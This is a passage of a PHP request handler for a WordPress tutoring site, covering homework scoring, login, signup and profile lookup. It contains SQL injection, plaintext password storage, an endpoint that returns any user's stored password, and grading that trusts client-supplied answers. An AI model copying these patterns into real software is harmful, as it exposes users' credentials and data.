    $save_answer = '';
    $arr_answer = explode(",", $answer);
    for ($i = 0; $i < count($arr_answer); $i++) {
        $an = explode(":", $arr_answer[$i]);
        $answer_corr .= $an[1];
        // save answer dưới dạng json
        if ($i == 0) {
            $a = explode(":", $arr_answer[0]);
            $b = explode("{", $a[0]);
            $save_answer .= '{' . '"' . $b[1] . '":"' . $a[1] . '",';
        } else if ($i == count($arr_answer) - 1) {
            $c = explode(":", $arr_answer[$i]);
            $d = explode("}", $c[1]);
            $save_answer .= '"' . $c[0] . '":"' . $d[0] . '"}';
        } else {
            $e = explode(":", $arr_answer[$i]);
            $save_answer .= '"' . $e[0] . '":"' . $e[1] . '",';
        }
    }
//    var_dump($data_correct_answer);die;
    $answer_corr = rtrim($answer_corr, '}');
    if ($answer_corr == $data_correct_answer) {
        $score = 100;
        $correct_answers_count = 1;
    } else {
        $score = 0;
        $correct_answers_count = 0;
    }
//    var_dump(date("Y-m-d"));die;
    $data = array(
        'userid' => $user_id,
        'homework_id' => $hid,
        'answers' => $save_answer,
        'score' => $score,
        'correct_answers_count' => $correct_answers_count,
        'attempted_on' => date("Y-m-d"),
        'submitted_on' => date("Y-m-d"),
        'finished_question' => 1,
        'finished' => 1,
        'graded' => 1,
            //'message' => $_REAL_POST['feedback']
    );
    if ($check->id != "") {
        // update answer user
        $id = $check->id;
        MWDB::update_answer_user_test_mode($id, $data);
    } else {
        // insert new answer user
        MWDB::add_new_answer_user_test_mode($data);
    }

//    $data = MWDB::get_assignment_id_by_sid($sid);
    echo $data;
    die;
}
// type 2 -> assignment_id == 11 || assignment_id == 15
if ($task == "set_answer_test_mode_type2") {
    $hid = $_REQUEST['hid'];
    $answer = $_REQUEST['data_answer'];
    $stt_id = (int) $_REQUEST['stt'];
    $data_correct_answer = $_REQUEST['data_correct_answer'];
    $user_id = get_current_user_id();
    $check = MWDB::check_answer_user_exit($user_id, $hid);
    $str_answer = '';
    $score = 0;
    $correct_answers_count = 0;
    $score_per_question = 100 / count($data_correct_answer);
    if ($check->id != "") {
        // update câu trả lời
        // get câu trả lời
        $get_answer = $check->answers;
        $arr_get_answer = explode(",", $get_answer);
        $arr_get_answer[$stt_id - 1] = $answer;

        for ($i = 0; $i < count($data_correct_answer); $i++) {
            if ($arr_get_answer[$i] == $data_correct_answer[$i]) {
                $score += $score_per_question;
                $correct_answers_count++;
            }
            $str_answer .= $arr_get_answer[$i] . ',';
        }
        $str_answer = substr($str_answer, 0, -1);
    } else {
        // insert new câu trả lời
        for ($i = 1; $i <= count($data_correct_answer); $i++) {
            if ($i == $stt_id) {
                $str_answer .= $answer . ",";
//                var_dump($data_correct_answer[$i-1]);die;
                if ($answer == $data_correct_answer[$i - 1]) {
                    $score += $score_per_question;
                    $correct_answers_count++;
                }
            } else {
                $str_answer .= ",";
            }
        }
        $str_answer = substr($str_answer, 0, -1);
    }
//    var_dump($score);die;
    $data_2 = array(
        'userid' => $user_id,
        'homework_id' => $hid,
        'answers' => $str_answer,
        'score' => $score,
        'correct_answers_count' => $correct_answers_count,
        'attempted_on' => date("Y-m-d"),
        'submitted_on' => date("Y-m-d"),
        'finished_question' => 1,
        'finished' => 1,
        'graded' => 1,
            //'message' => $_REAL_POST['feedback']
    );
    if ($check->id != "") {
        // update answer user
        $id = $check->id;
        MWDB::update_answer_user_test_mode($id, $data_2);
    } else {
        // insert new answer user
        MWDB::add_new_answer_user_test_mode($data_2);
    }

    $data = MWDB::get_assignment_id_by_sid($sid);
    echo $data;
    die;
}
if ($task == "set_answer_test_mode_type3") {
    $hid = $_REQUEST['hid'];
    $answer = $_REQUEST['data_answer'];
    $data_correct_answer = $_REQUEST['data_correct_answer'];
//    var_dump($data_correct_answer);die;
    $user_id = get_current_user_id();
    $check = MWDB::check_answer_user_exit($user_id, $hid);
    $answer_new = "";
    for ($i = 0; $i < count($data_correct_answer); $i++) {
        $answer_new .= $answer[$i] . ',';
    }
    $answer_new = substr($answer_new, 0, -1);  // Array câu trả lời
//    var_dump($answer_new);die;
// var_dump(json_encode($answer));die;
// Tính điểm tự động insert vào db

    $score = 0;
    $correct_answers_count = 0;
    $score_per_question = 100 / count($data_correct_answer);
    for ($i = 0; $i < count($data_correct_answer); $i++) {
        if ($answer[$i] === $data_correct_answer[$i]) {
            $score += $score_per_question;
            $correct_answers_count++;
        }
    }
//    var_dump($answer_new);die;
//    var_dump($answer_correct_new);die;
    $data = array(
        'userid' => $user_id,
        'homework_id' => $hid,
        'answers' => $answer_new,
        'score' => $score,
        'correct_answers_count' => $correct_answers_count,
        'attempted_on' => date("Y-m-d"),
        'submitted_on' => date("Y-m-d"),
        'finished_question' => 1,
        'finished' => 1,
        'graded' => 1,
            //'message' => $_REAL_POST['feedback']
    );
    if ($check->id != "") {
        // update answer user
        $id = $check->id;
        MWDB::update_answer_user_test_mode($id, $data);
    } else {
        // insert new answer user
        MWDB::add_new_answer_user_test_mode($data);
    }

//    $data = MWDB::get_assignment_id_by_sid($sid);
    echo $data;
    die;
}
if ($task == "set_answer_test_mode_type4") {
    $hid = $_REQUEST['hid'];
    $answer = $_REQUEST['data_answer'];
    $data_correct_answer = $_REQUEST['data_correct_answer'];
//    var_dump($data_correct_answer);die;
    $user_id = get_current_user_id();
    $check = MWDB::check_answer_user_exit($user_id, $hid);
// Tính điểm tự động insert vào db

    $score = 0;
    $correct_answers_count = 0;
    if ($answer == $data_correct_answer) {
        $correct_answers_count = 1;
        $score = 100;
    }
    $data = array(
        'userid' => $user_id,
        'homework_id' => $hid,
        'answers' => $answer,
        'score' => $score,
        'correct_answers_count' => $correct_answers_count,
        'attempted_on' => date("Y-m-d"),
        'submitted_on' => date("Y-m-d"),
        'finished_question' => 1,
        'finished' => 1,
        'graded' => 1,
            //'message' => $_REAL_POST['feedback']
    );
    if ($check->id != "") {
        // update answer user
        $id = $check->id;
        MWDB::update_answer_user_test_mode($id, $data);
    } else {
        // insert new answer user
        MWDB::add_new_answer_user_test_mode($data);
    }

//    $data = MWDB::get_assignment_id_by_sid($sid);
    echo $data;
    die;
}

if ($task == "set_answer_test_mode_type5") {
    $hid = $_REQUEST['hid'];
    $answer = $_REQUEST['data_answer'];
    $data_correct_answer = $_REQUEST['data_correct_answer'];
//    var_dump($data_correct_answer);die;
    $user_id = get_current_user_id();
    $check = MWDB::check_answer_user_exit($user_id, $hid);
// Tính điểm tự động insert vào db
    $arr_answer = explode(",", $answer);
    $arr_correct_answer = explode(",", $data_correct_answer);
//    var_dump($arr_correct_answer);die;
    $score = 0;
    $correct_answers_count = 0;
    $score_per_question = 100 / count($arr_correct_answer);
    for ($i = 0; $i < count($arr_correct_answer); $i++) {
        if ($arr_answer[$i] == $arr_correct_answer[$i]) {
            $score += $score_per_question;
            $correct_answers_count++;
        }
    }
    $data = array(
        'userid' => $user_id,
        'homework_id' => $hid,
        'answers' => $answer,
        'score' => $score,
        'correct_answers_count' => $correct_answers_count,
        'attempted_on' => date("Y-m-d"),
        'submitted_on' => date("Y-m-d"),
        'finished_question' => 1,
        'finished' => 1,
        'graded' => 1,
            //'message' => $_REAL_POST['feedback']
    );
    if ($check->id != "") {
        // update answer user
        $id = $check->id;
        MWDB::update_answer_user_test_mode($id, $data);
    } else {
        // insert new answer user
        MWDB::add_new_answer_user_test_mode($data);
    }

//    $data = MWDB::get_assignment_id_by_sid($sid);
    echo $data;
    die;
}

if ($task == "get_image_answer") {
    $sid = $_REQUEST['sid'];
    $question = MWDB::get_question_sheet($sid);
    echo json_encode($question);
    die;
}

if ($task == "load_img_answer") {
    $url_file = $_REQUEST['url'];
    $url = MWHtml::math_image_url($url_file);
    $html = '';
    $html .= '<img src=' . $url . ' alt="" >';
    echo $html;
    die;
}

if ($task == "get_answer_last_type1") {
    $sid = $_REQUEST['sid'];
    $last_answer = MWDB::get_answer_last_type1($sid);
    echo $last_answer;
    die;
}

if ($task == "get_answer_sheet") {
    $id = $_REQUEST['id'];
    $sid = $_REQUEST['sid'];
    $data = MWDB::get_answer_sheet_by_current($id, $sid);
    echo $data;
    die;
}

if ($task == "clear_answer") {
    $hid = $_REQUEST['hid'];
    $user_id = get_current_user_id();
    $check = MWDB::check_have_answer_by_hid($user_id, $hid);
    if ($check) {
        // clear answer
        MWDB::clear_answer_by_hid($user_id, $hid);
    }
    die;
}

if ($task == "get_answer_correct_by_sid") {
    $sid = $_REQUEST['sid'];
    $data = MWDB::get_answer_correct_by_sid($sid);
    echo $data;
    die;
}
if ($task == 'update_class_type') {
    $id = $_REQUEST["id"];
    $desc = $_REQUEST["desc"];
    $query = "UPDATE " . $wpdb->prefix . "dict_group_class_types SET description='$desc' WHERE id=$id";
    $result = $wpdb->query($query);
    if ($result) {
        echo 1;
    }

    die;
}
if ($task == 'description_class_type') {
    $id = $_REQUEST['id'];
    $query = "SELECT description FROM " . $wpdb->prefix . "dict_group_class_types WHERE id=$id";
    $result = $wpdb->get_var($query);
    echo $result;

    die;
}
if ($task == 'get_assignment') {
    $level = $_REQUEST['data'];
    $selected=$_REQUEST['selected'];

    $types = $wpdb->get_results(
            'SELECT a.id, has.name'
            . ' FROM ' . $wpdb->prefix . 'dict_homework_assignments AS a'
            . ' JOIN ' . $wpdb->prefix . 'dict_homework_assignment_langs AS has ON has.assignment_id = a.id '
            . 'WHERE type = \'ENGLISH\'   AND lang = \'' . get_short_lang_code() . '\'');
    $html = '';
    $html .= '<option value="">-Worksheet Format-</option>';
    if($level!=='-Subject-'){
    foreach ($types as $type) {
        $html .= '<option value="' . $type->id . '" ';
        if( (int)$selected== $type->id){  $html .=' selected';}else{ $html .= '1 ';}
        $html .='>' . $level . ' ' . $type->name . ' </option>';
    }
    }
    echo $html;
    die;
}
if ($task == 'get_lesson_list') {
    $subject=$_REQUEST['data'];
    $id=$_GET['id'];
    //var_dump($id);
    $types = $wpdb->get_results(
            'SELECT a.id, has.name'
            . ' FROM ' . $wpdb->prefix . 'dict_homework_assignments AS a'
            . ' JOIN ' . $wpdb->prefix . 'dict_homework_assignment_langs AS has ON has.assignment_id = a.id '
            . 'WHERE  type = \'ENGLISH\'   AND lang = \'' . get_short_lang_code() . '\'');
    $html = '';
    foreach ($types as $type) {
        $html .= '<tr>'
                . ' <td><input class="checkboxagree"  type="checkbox" id="checkboxagree" value="' . $type->id . '"></td>'
                . ' <td>'.$subject.' '.$type->name.'</td>'
                   .' <td><input type="text" class="form-control txt-name" placeholder="New name"></td>'
                . ' <td><button type="button" class="btn btn-default btn-block grey form-control btn-rename" data-loading-text="Saving..." data-id="'.$type->id.'">Save</button></td>'
                    .'<td style="width: 100px">'
                . '<button type="button" name="order-up" class="btn btn-micro grey order-btn sub-order-up" data-id="'.$type->id.'"><span class="icon-uparrow"></span></button>'
                . ' <button type="button" name="order-down" class="btn btn-micro grey order-btn sub-order-down" data-id="'.$type->id.'"><span class="icon-downarrow"></span></button>'
                    .'<span class="ordering"></span>'
                       .' </td>'
               .' </tr>';
    }
    echo $html;
    die;
}
if ($task == "login_account") {
    $user_name = $_REQUEST['user_name'];
    $user_password = $_REQUEST['user_password'];

    $creds['user_login'] = $user_name;
    $creds['user_password'] = $user_password;
    $user = wp_signon($creds, false);
    if(is_wp_error($user))
    {
        echo __('Please check your Login Email address or Password and try it again.', 'iii-dictionary');
    }else{
        update_user_meta($user->ID, 'newuser', 1);
        echo '1';
    }
    exit();
}
if ($task == "create_account") {
    $user_name = $_REQUEST['user_name'];
    $user_password = $_REQUEST['user_password'];
    $confirm_password = $_REQUEST['confirm_password'];
    $first_name = $_REQUEST['first_name'];
    $last_name = $_REQUEST['last_name'];
    $birth_m = $_REQUEST['birth_m'];
    $birth_d = $_REQUEST['birth_d'];
    $birth_y = $_REQUEST['birth_y'];
    $cb_lang = $_REQUEST['cb_lang'];
    $profile_avatar = $_REQUEST['profile_avatar'];
    $gender = $_REQUEST['gender'];
    $time_zone = $_REQUEST['time_zone'];
    $time_zone_index = $_REQUEST['time_zone_index'];

    $html = '';
    $form_valid = true;
    if (is_email($user_name)) {
        if (email_exists($user_name) || username_exists($user_name)) {
            $html .= '<strong>' . __('Error', 'iii-dictionary') . '</strong>: ' . __('This email address is already registered. Please choose another one.', 'iii-dictionary');
            $html .= '<br/>';
            $form_valid = false;
        }
        $user_email = $user_name;
    } else {
// we don't accept normal string as username anymore
        $html .= '<strong>' . __('Error', 'iii-dictionary') . '</strong>: ' . __('This email address is invalid. Please choose another one.', 'iii-dictionary');
        $html .= '<br/>';
        $form_valid = false;
    }

    if (trim($user_password) == '') {
        $html .= '<strong>' . __('Error', 'iii-dictionary') . '</strong>: ' . __('Passwords must not be empty', 'iii-dictionary');
        $html .= '<br/>';
        $form_valid = false;
    }

    if ($user_password !== $confirm_password) {
        $html .= '<strong>' . __('Error', 'iii-dictionary') . '</strong>: ' . __('Passwords must match', 'iii-dictionary');
        $html .= '<br/>';
        $form_valid = false;
    }

    if (strlen($user_password) < 6) {
        $html .= '<strong>' . __('Error', 'iii-dictionary') . '</strong>: ' . __('Passwords must be at least six characters long', 'iii-dictionary');
        $html .= '<br/>';
        $form_valid = false;
    }

    if (trim($gender) == '') {
        $html .= '<strong>' . __('Error', 'iii-dictionary') . '</strong>: ' . __('Please choose Gender', 'iii-dictionary');
        $html .= '<br/>';
        $form_valid = false;
    }

    if ($birth_y != '' && is_numeric($birth_y)) {
        $y = date('Y',time()) - (int)$birth_y;
        if($y < 9){
            $html .= '<strong>' . __('Error', 'iii-dictionary') . '</strong>: ' . __('This Year is invalid. Please choose another one.', 'iii-dictionary');
            $html .= '<br/>';
            $form_valid = false;
        }else{
            if (checkdate($birth_m, $birth_d, $birth_y)) {
                $date_of_birth = $birth_m . '/' . $birth_d . '/' . $birth_y;
            } else {
                $html .= '<strong>' . __('Error', 'iii-dictionary') . '</strong>: ' . __('Invalid date of birth', 'iii-dictionary');
                $html .= '<br/>';
                $form_valid = false;
            }
        }
    } else {
        $date_of_birth = '';
    }

    if (count($cb_lang) == 0) {
        $html .= '<strong>' . __('Error', 'iii-dictionary') . '</strong>: ' . __('Please check the box of Language', 'iii-dictionary');
        $html .= '<br/>';
        $form_valid = false;
    }

    if ($form_valid) {
        if (isset($user_email)) {
            $user_id = wp_create_user($user_name, $user_password, $user_email);
        } else {
            $user_id = wp_create_user($user_name, $user_password);
        }

//$userdata['ID'] = $user_id;

        if (isset($first_name) && trim($first_name) != '') {
            update_user_meta($user_id, 'first_name', $first_name);
        }

        if (isset($last_name) && trim($last_name) != '') {
            update_user_meta($user_id, 'last_name', $last_name);
        }

        if (isset($first_name) && trim($first_name) != '' && isset($last_name) && trim($last_name) != '') {
            $display_name = $first_name . ' ' . $last_name;
            update_user_meta($user_id, 'display_name', $display_name);
        }

        if (count($cb_lang) > 0) {
            $language_type = implode(',', $cb_lang);
            update_user_meta($user_id, 'language_type', $language_type);
        }

        if (isset($profile_avatar) && trim($profile_avatar) != '') {
            update_user_meta($user_id, 'ik_user_avatar', $profile_avatar);
        }

        if (isset($gender) && trim($gender) != '') {
            update_user_meta($user_id, 'gender', $gender);
        }

        if (isset($time_zone) && trim($time_zone) != '') {
            update_user_meta($user_id, 'user_timezone', $time_zone);
            update_user_meta($user_id, 'time_zone_index', $time_zone_index);
        }

        update_user_meta($user_id, 'date_of_birth', $date_of_birth);

        update_user_meta($user_id, 'user_password', $user_password);

        update_user_meta($user_id, 'newuser', 1);
        
        // auto login the user
        $creds['user_login'] = $user_name;
        $creds['user_password'] = $user_password;
        $user = wp_signon($creds, false);

        // send confirmation email
        if (is_email($user_email)) {
            $title = __('Your account has been created successfully!', 'iii-dictionary');
            $message = __('<p style="font-size: 14px; font-family: Lucida Console;">You have successfully signed up for iktutor.com.</p>', 'iii-dictionary') . "\r\n\r\n" .
                    __('<p style="font-size: 14px; font-family: Lucida Console;">If you have questions or need support, please contact us at support@iktutor.com.</p>', 'iii-dictionary') . "\r\n\r\n" .
                    __('<p style="font-size: 14px; font-family: Lucida Console;">If you are a student, you can take an online course or get help from a live online tutor.</p>', 'iii-dictionary') . "\r\n\r\n\r\n" .
                    __('<p style="font-size: 14px; font-family: Lucida Console;">If you are registered as a tutor, you can provide help to students with homework or other subjects. You can earn some income by tutoring or offering an online course.</p>', 'iii-dictionary') . "\r\n\r\n\r\n" .
                    __('<p style="font-size: 14px; font-family: Lucida Console;">Welcome to the IKtutor community!<p>');

            wp_mail($user_email, wp_specialchars_decode($title), $message);
        }

        $_SESSION['newuser'] = 1;
        echo '1';
    } else {
        echo $html;
    }
    exit();
}
if ($task == "get_user_info") {
    $userid = $_REQUEST['userid'];
    $uid = $_REQUEST['uid'];
    $type = $_REQUEST['type'];

    if($userid == ''){
        $current_user = wp_get_current_user();
        $user = get_user_by('id', $current_user->ID);
    }else{
        $user = get_user_by('id', $userid);
    }

    if($type == "resume")
        $img = 'icon_Tutor_ID.png';
    else
        $img = 'Profile_Image.png';
    
    $cb_lang = array();
    $subject_type_update = array();
    $birth_m = '';
    $birth_d = '';
    $birth_y = '';

    $user_email = $user->user_email;
    $username = $user->display_name;
    $display_name = get_user_meta($user->ID, 'display_name', true);
    $first_name = get_user_meta($user->ID, 'first_name', true);
    $last_name = get_user_meta($user->ID, 'last_name', true);
    $user_password = get_user_meta($user->ID, 'user_password', true);
    $gender = get_user_meta($user->ID, 'gender', true);
    $date_of_birth = get_user_meta($user->ID, 'date_of_birth', true);
    if($date_of_birth != ''){
        $arr_birth = explode('/', $date_of_birth);
        $birth_m = isset($arr_birth[0])?$arr_birth[0]:'';
        $birth_d = isset($arr_birth[1])?$arr_birth[1]:'';
        $birth_y = isset($arr_birth[2])?$arr_birth[2]:'';
    }
    $language_type = get_user_meta($user->ID, 'language_type', true);
    if($language_type != '') $cb_lang = explode(',', $language_type);

    $profile_value = get_user_meta($user->ID, 'ik_user_avatar', true);

    $mobile_number = get_user_meta($user->ID, 'mobile_number', true);
    $user_profession = get_user_meta($user->ID, 'user_profession', true);
    $last_school = get_user_meta($user->ID, 'last_school', true);
    $previous_school = get_user_meta($user->ID, 'previous_school', true);
    $skype_id = get_user_meta($user->ID, 'skype_id', true);
    $desc_tell_me = get_user_meta($user->ID, 'desc_tell_me', true);
    $subject_type = get_user_meta($user->ID, 'subject_type', true);
    if($subject_type != '') $subject_type_update = explode(',', $subject_type);
    $school_name = get_user_meta($user->ID, 'school_name', true);
    $teaching_link = get_user_meta($user->ID, 'teaching_link', true);
    $teaching_subject = get_user_meta($user->ID, 'teaching_subject', true);
    $student_link = get_user_meta($user->ID, 'student_link', true);
    $user_years = get_user_meta($user->ID, 'user_years', true);
    $school_attend = get_user_meta($user->ID, 'school_attend', true);
    $user_gpa = get_user_meta($user->ID, 'user_gpa', true);
    $user_grade = get_user_meta($user->ID, 'user_grade', true);
    $user_major = get_user_meta($user->ID, 'user_major', true);
    $school_name1 = get_user_meta($user->ID, 'school_name1', true);
    $school_name2 = get_user_meta($user->ID, 'school_name2', true);
    $school_link1 = get_user_meta($user->ID, 'school_link1', true);
    $school_link2 = get_user_meta($user->ID, 'school_link2', true);
    $any_other = get_user_meta($user->ID, 'any_other', true);
    $subject_description = get_user_meta($user->ID, 'subject_description', true);
    $time_zone_index = get_user_meta($user->ID, 'time_zone_index', true);
    $time_zone = get_user_meta($user->ID, 'user_timezone', true);
    $time_zone = empty($time_zone) ? 0 : $time_zone;
    $time_zone_index = empty($time_zone_index) ? 0 : $time_zone_index;
    $location_time = convert_timezone_to_location($time_zone_index);
    $time_zone_name = get_user_meta($user->ID, 'time_zone_name', true);
    $timezone_name = empty($time_zone_name)? convert_timezone_to_name($time_zone_index) : $time_zone_name;
    if(is_mw_qualified_teacher($user->ID) || is_mw_registered_teacher($user->ID))
        $chk_teacher = 1;
    else
        $chk_teacher = 0;

    if (!empty($profile_value))
        $user_avatar = $profile_value;
    else
        $user_avatar = get_template_directory_uri().'/library/images/'.$img;

    if (!empty($display_name) && $display_name != '')
        $user_name = $display_name;
    else if((!empty($first_name) && $first_name != '') || (!empty($last_name) && $last_name != ''))
        $user_name = $first_name.' '.$last_name;
    else
        $user_name = $username;

    $query = 'SELECT rv.* FROM ' . $wpdb->prefix . 'dict_tutor_review AS rv WHERE rv.review_id = '.$user->ID;
    $reviews = $wpdb->get_results($query);
    $star = 0;
    $cnt = count($reviews);
    $arr_review = array();
    if(count($reviews) > 0){
        $itemrv = array();
        foreach ($reviews as $key => $value) {
            $review_uname = get_user_by('id', $value->userid);
            $review_dname = get_user_meta($value->userid, 'display_name', true);
            $star += $value->star;
            $itemrv['id'] = $value->id;
            $itemrv['review_id'] = $value->review_id;
            $itemrv['star'] = $value->star;
            $itemrv['userid'] = $value->userid;
            $itemrv['subject'] = $value->subject;
            $itemrv['message'] = $value->message;
            if($review_dname)
                $itemrv['review_name'] = $review_dname;
            else
                $itemrv['review_name'] = $review_uname->display_name;
            $arr_review[] = $itemrv;
        }
    }
    if($cnt == 0)
        $total_star = $star;
    else
        $total_star = ceil($star/$cnt);

    $book_mark = get_user_meta($user->ID, 'book_mark', true);
    $favorite = 0;
    if (!empty($book_mark) && $book_mark != ''){
        $arr_favorite = explode(',', $book_mark);
        $favorite = count($arr_favorite);
    }

    $query1 = 'SELECT id FROM ' . $wpdb->prefix . 'dict_groups WHERE created_by = '.$user->ID;
    $rows = $wpdb->get_results($query1);
    $fromclass = count($rows);

    $query_tp = "SELECT tp.id
            FROM " . $wpdb->prefix . "dict_tutoring_plan AS tp
            WHERE tp.id_user = ".$uid." AND canceled = 0 AND tp.tutor_id = ".$user->ID;
    $rows_tp = $wpdb->get_results($query_tp);
    $schedules = count($rows_tp);
    //$cnt = $cnt + $fromclass + $favorite;

    $data = array(
                'ID' => $user->ID,
                'user_email' => $user_email,
                'first_name' => $first_name,
                'last_name' => $last_name,
                'user_password' => $user_password,
                'gender' => $gender,
                'birth_m' => $birth_m,
                'birth_d' => $birth_d,
                'birth_y' => $birth_y,
                'cb_lang' => $cb_lang,
                'profile_value' => $profile_value,
                'mobile_number' => $mobile_number,
                'user_profession' => $user_profession,
                'last_school' => $last_school,
                'previous_school' => $previous_school,
                'skype_id' => $skype_id,
                'desc_tell_me' => $desc_tell_me,
                'subject_type' => $subject_type_update,
                'school_name' => $school_name,
                'teaching_link' => $teaching_link,
                'teaching_subject' => $teaching_subject,
                'user_years' => $user_years,
                'school_attend' => $school_attend,
                'student_link' => $student_link,
                'user_gpa' => $user_gpa,
                'user_grade' => $user_grade,
                'user_major' => $user_major,
                'school_name1' => $school_name1,
                'school_name2' => $school_name2,
                'school_link1' => $school_link1,
                'school_link2' => $school_link2,
                'any_other' => $any_other,
                'subject_description' => $subject_description,
                'date_of_birth' => $date_of_birth,
                'chk_teacher' => $chk_teacher,
                'user_avatar' => $user_avatar,
                'user_name'   => $user_name,
                'star' => $total_star,
                'reviews' => $arr_review,
                'cnt' => $cnt,
                'time_zone' => $time_zone,
                'time_zone_index' => $time_zone_index,
                'location_time' => $location_time,
                'timezone_name' => $timezone_name,
                'schedules' => $schedules
            );
    echo json_encode($data);
    die;
}
if ($task == "get_user_profile") {
    $current_user = wp_get_current_user();
    $user = get_user_by('id', $current_user->ID);
   
    $user_email = $user->user_email;
    $username = $user->display_name;
    $display_name = get_user_meta($user->ID, 'display_name', true);
    $first_name = get_user_meta($user->ID, 'first_name', true);
    $last_name = get_user_meta($user->ID, 'last_name', true);
    $date_of_birth = get_user_meta($user->ID, 'date_of_birth', true);
    $language_type = get_user_meta($user->ID, 'language_type', true);
    $profile_value = get_user_meta($user->ID, 'ik_user_avatar', true);
    $mobile_number = get_user_meta($user->ID, 'mobile_number', true);
    $user_profession = get_user_meta($user->ID, 'user_profession', true);
    $last_school = get_user_meta($user->ID, 'last_school', true);
    $previous_school = get_user_meta($user->ID, 'previous_school', true);
    $skype_id = get_user_meta($user->ID, 'skype_id', true);
    $gender = get_user_meta($user->ID, 'gender', true);
    $time_zone_index = get_user_meta($user->ID, 'time_zone_index', true);
    $time_zone = get_user_meta($user->ID, 'user_timezone', true);
    $time_zone = empty($time_zone) ? 0 : $time_zone;
    $time_zone_index = empty($time_zone_index) ? 0 : $time_zone_index;
    $location_time = convert_timezone_to_location($time_zone_index);
    $time_zone_name = get_user_meta($user->ID, 'time_zone_name', true);
    $timezone_name = empty($time_zone_name)? convert_timezone_to_name($time_zone_index):$time_zone_name;
    if (!empty($profile_value))
        $user_avatar = $profile_value;
    else
        $user_avatar = get_template_directory_uri().'/library/images/Profile_Image.png';

    if (!empty($display_name) && $display_name != '')
        $user_name = $display_name;
    else if((!empty($first_name) && $first_name != '') || (!empty($last_name) && $last_name != ''))
        $user_name = $first_name.' '.$last_name;
    else if(!empty($username) && $username != '')
        $user_name = $username;
    else
        $user_name = __('N/A', 'iii-dictionary');

    $user_points = get_user_meta($user->ID, 'user_points', true);
    $user_points = empty($user_points) ? 0 : $user_points;

    $user_earned = get_user_meta($user->ID, 'user_earned', true);
    $user_earned = empty($user_earned) ? 0 : $user_earned;

    if(is_mw_registered_teacher($user->ID, 0))
        $english_writting = __('Qualified', 'iii-dictionary');
    else
        $english_writting = __('Not Qualified Yet', 'iii-dictionary');

    if(is_mw_qualified_teacher($user->ID, 0))
        $english_conversation = __('Qualified', 'iii-dictionary');
    else
        $english_conversation = __('Not Qualified Yet', 'iii-dictionary');

    if(is_mw_registered_teacher($user->ID, 1))
        $math_up = __('Qualified', 'iii-dictionary');
    else
        $math_up = __('Not Qualified Yet', 'iii-dictionary');

    if(is_mw_qualified_teacher($user->ID, 1))
        $math_conversation = __('Qualified', 'iii-dictionary');
    else
        $math_conversation = __('Not Qualified Yet', 'iii-dictionary');

    if (!empty($user_email))
        $uemail = $user_email;
    else
        $uemail = __('N/A', 'iii-dictionary');

    if (!empty($date_of_birth) && $date_of_birth != '')
        $dbirth = $date_of_birth;
    else
        $dbirth = __('N/A', 'iii-dictionary');

    if (!empty($language_type) && $language_type != '') {
        $langs = array(
            'en' => 'English',
            'ja' => '日本語',
            'ko' => '한국어',            
            'zh' => '中文',
            'zh-tw' => '中國',
            'vi' => 'Tiếng Việt',
            'ot' => 'Others'
        );
        $languages_t = explode(',', $language_type);
        $lang = '';
        if (count($languages_t) > 0) {
            $n = count($languages_t) - 1;
            for ($i = 0; $i < count($languages_t); $i++) {
                $key = $languages_t[$i];
                $lang .= $langs[$key];
                if (count($languages_t) > 1 && $i < $n)
                    $lang .= ', ';
            }
        }
    } else
        $lang = __('N/A', 'iii-dictionary');

    if (!empty($mobile_number) && $mobile_number != '')
        $user_mobile_number = $mobile_number;
    else
        $user_mobile_number = __('N/A', 'iii-dictionary');

    if (!empty($last_school) && $last_school != '')
        $user_last_school = $last_school;
    else
        $user_last_school = __('N/A', 'iii-dictionary');

    if (!empty($skype_id) && $skype_id != '')
        $user_skype_id = $skype_id;
    else
        $user_skype_id = __('N/A', 'iii-dictionary');

    if (!empty($previous_school) && $previous_school != '')
        $user_previous_school = $previous_school;
    else
        $user_previous_school = __('N/A', 'iii-dictionary');

    if (!empty($user_profession) && $user_profession != '')
        $u_profession = $user_profession;
    else
        $u_profession = __('N/A', 'iii-dictionary');

    $data = array(                
                'user_avatar' => $user_avatar,
                'user_name' => $user_name,
                'gender' => $gender,
                'user_points' => $user_points.' (USD)',
                'user_earned' => $user_earned.' (USD)',   
                'english_writting' => $english_writting,
                'english_conversation' => $english_conversation,
                'math_up' => $math_up,
                'math_conversation' => $math_conversation,
                'uemail' => $uemail,
                'dbirth' => $dbirth,
                'langs' => $lang,
                'user_mobile_number' => $user_mobile_number,
                'user_last_school' => $user_last_school,
                'user_skype_id' => $user_skype_id,
                'user_previous_school' => $user_previous_school,
                'u_profession' => $u_profession,
                'time_zone' => $time_zone,
                'time_zone_index' => $time_zone_index,
                'location_time' => $location_time,
                'timezone_name' => $timezone_name
            );
    echo json_encode($data);
    die;
}
if ($task == "update_info") {
    $user_email = $_REQUEST['user_email'];
    $new_password = $_REQUEST['new_password'];
    $retype_new_password = $_REQUEST['retype_new_password'];
    $mobile_number = $_REQUEST['mobile_number'];
    $last_school = $_REQUEST['last_school'];
    $previous_school = $_REQUEST['previous_school'];
    $skype_id = $_REQUEST['skype_id'];
    $user_profession = $_REQUEST['user_profession'];
    $cb_lang = $_REQUEST['cb_lang'];
    $profile_avatar = $_REQUEST['profile_avatar'];
    $first_name = $_REQUEST['first_name'];
    $last_name = $_REQUEST['last_name'];
    $birth_y = $_REQUEST['birth_y'];
    $birth_m = $_REQUEST['birth_m'];
    $birth_d = $_REQUEST['birth_d'];
    $gender = $_REQUEST['gender'];
    $subject_type = $_REQUEST['subject_type'];
    $desc_tell_me = $_REQUEST['desc_tell_me'];
    $user_grade = $_REQUEST['user_grade'];
    $any_other = $_REQUEST['any_other'];
    $school_link2 = $_REQUEST['school_link2'];
    $school_link1 = $_REQUEST['school_link1'];
    $school_name2 = $_REQUEST['school_name2'];
    $school_name1 = $_REQUEST['school_name1'];
    $user_major = $_REQUEST['user_major'];
    $user_gpa = $_REQUEST['user_gpa'];
    $school_attend = $_REQUEST['school_attend'];
    $user_years = $_REQUEST['user_years'];
    $student_link = $_REQUEST['student_link'];
    $teaching_subject = $_REQUEST['teaching_subject'];
    $teaching_link = $_REQUEST['teaching_link'];
    $school_name = $_REQUEST['school_name'];
    $subject_description = $_REQUEST['subject_description'];
    $type = $_REQUEST['type'];
    $time_zone = $_REQUEST['time_zone'];
    $time_zone_index = $_REQUEST['time_zone_index'];
    $time_zone_name = $_REQUEST['time_zone_name'];
    $gender = $_REQUEST['gender'];

    $current_user = wp_get_current_user();
    if($type == 'create'){
        $form_valid = false;
        if (isset($mobile_number) && trim($mobile_number) != '') {
            $form_valid = true;
            update_user_meta($current_user->ID, 'mobile_number', $mobile_number);
        }

